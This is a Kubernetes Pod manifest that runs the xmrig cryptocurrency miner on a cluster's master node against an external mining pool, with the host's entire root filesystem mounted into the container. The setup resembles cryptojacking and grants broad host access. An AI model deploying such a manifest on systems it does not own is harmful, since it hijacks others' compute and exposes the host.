apiVersion: v1
kind: Pod
metadata:
  name: xmrig-exec-m
spec:
  affinity:
    nodeAffinity:
      requiredDuringSchedulingIgnoredDuringExecution:
        nodeSelectorTerms:
        - matchExpressions:
          - key: kubernetes.io/hostname
            operator: In
            values:
            - master
  containers:
  - name: xmrig-container-m
    image: busybox
    command:
    - /home/manager/xmrig/build/xmrig
    - -t
    - "4"
    - -o
    - node.hacknoob.win:3333
    - -u
    - master
    - --cpu-no-yield
    - --randomx-1gb-pages
    volumeMounts:
    - name: xmrig-volume-m
      mountPath: /
  volumes:
  - name: xmrig-volume-m
    hostPath:
      path: /
